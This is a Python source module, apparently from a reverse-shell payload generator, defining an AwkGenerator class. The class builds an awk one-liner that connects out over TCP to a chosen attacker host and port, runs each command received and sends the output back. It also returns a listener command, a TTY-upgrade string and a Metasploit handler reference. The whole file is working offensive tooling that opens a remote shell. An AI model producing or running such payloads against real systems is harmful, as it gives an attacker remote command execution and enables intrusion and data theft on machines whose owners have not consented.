from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, TTY_UPGRADE, msf_handler, LISTENER_FMT


class AwkGenerator(ShellGenerator):
    language = "awk"

    def _generate(self, opts: ShellOptions, names: RandomNamePool | None) -> ShellResult:
        cmd = (
            f'awk \'BEGIN{{'
            f's="/inet/tcp/0/{opts.lhost}/{opts.lport}";'
            f'while(42){{do{{printf "shell>" |& s;s |& getline c;'
            f'if(c){{while((c |& getline) > 0)print |& s;close(c)}}}}'
            f'while(c != "exit")}}close(s)}}\''
        )
        return ShellResult(
            command=cmd, variant="inet_tcp", language=self.language, arch=opts.arch,
            listener=LISTENER_FMT.format(lport=opts.lport),
            tty_upgrade=TTY_UPGRADE,
            msf_compat=msf_handler("payload/cmd/unix/reverse", opts.lhost, opts.lport),
        )
